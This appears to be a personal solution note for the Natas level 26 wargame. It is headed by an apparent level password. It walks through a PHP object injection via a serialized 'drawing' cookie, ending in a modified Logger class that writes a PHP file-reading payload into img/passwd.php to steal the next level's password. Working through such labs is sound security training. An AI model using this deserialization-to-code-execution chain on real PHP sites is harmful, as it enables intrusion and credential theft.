oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

variables we control:
    x1 y1 x2 y2

cookies we control:
    drawing (x & y variables above in php array format)

Logger class
    not called directly by the application, but can be exploited.

    methods
        __construct
            takes $file as input
            creates log, or appends msgs to existing file
            variable $logFile sets path to /tmp/natas26_" . $file . ".log"
            perhaps this can be changed to display log on the main page?
                main page location should be
                /var/www/natas26/
            runs at the beginning of the script (magic php method)

        log
            takes $msg as input, appends $msg to log file
            uses location stored in $logFile

        __destruct
            no input, appends closing msg defined in $exitMsg to log file
            runs at end of script (magic php method)

    $mylog = new Logger($file);
        creates a new Logger class, referenced by the object $mylog
            __construct($file);
            is automatically called upon creation of a new Logger instance
            creates a log at location /tmp/natas26_`$file`.log
            and sets private $logFile variable in Logger to $file
        
    mylog->log($msg);
        adds $msg to log file. 
        
        

attack plan:
    create my own Logger
    set $logFile to an accessible path
    use the logger to execute this code <?php echo file_get_contents("/etc/natas_webpass/natas27");?>
    access the 'log' file.

the attack vector should be through the drawing cookie using php object injection
drawing cookie is seralized and base64 encoded

some code like this should create a Logger

    class Example2
    {
    private $hook = "phpinfo();";
    }

    print urlencode(serialize(new Example2));

which will be attached to a request like this

    GET /vuln.php HTTP/1.0
    Host: testsite.com
    Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
    Connection: close

in order for the attack to work, a serialized Logger needs to be sent to the server to unpack.
the Logger code from the page source can be modified to execute the exploit. 
__construct runs at the beginning of the script, and can be used to initialize the modified variables.
__destruct function runs at the end of the script, which happens every time we load the page.
by changing exitMsg to our payload, it will write the password at the end of the file.
the page can read images from the img/ folder, so this seems like a good place to put the 'log' file.
we cannot use the picture itself, because the picture gets rewritten each time the page loads.
remember that in order for the php to execute, the destiation file must have a .php extension.
also, make sure that any double quotes inside the payload are properly esacped.

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="<?php echo file_get_contents(\"/etc/natas_webpass/natas27\");?>";
            $this->logFile = "img/passwd.php";
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
           	
        }                       
    }

$mylog = new Logger();

print base64_encode(serialize($mylog));

set the value of the drawing cookie to the output.
then, navigate to the newly created img/passwd.php file to retreive the password.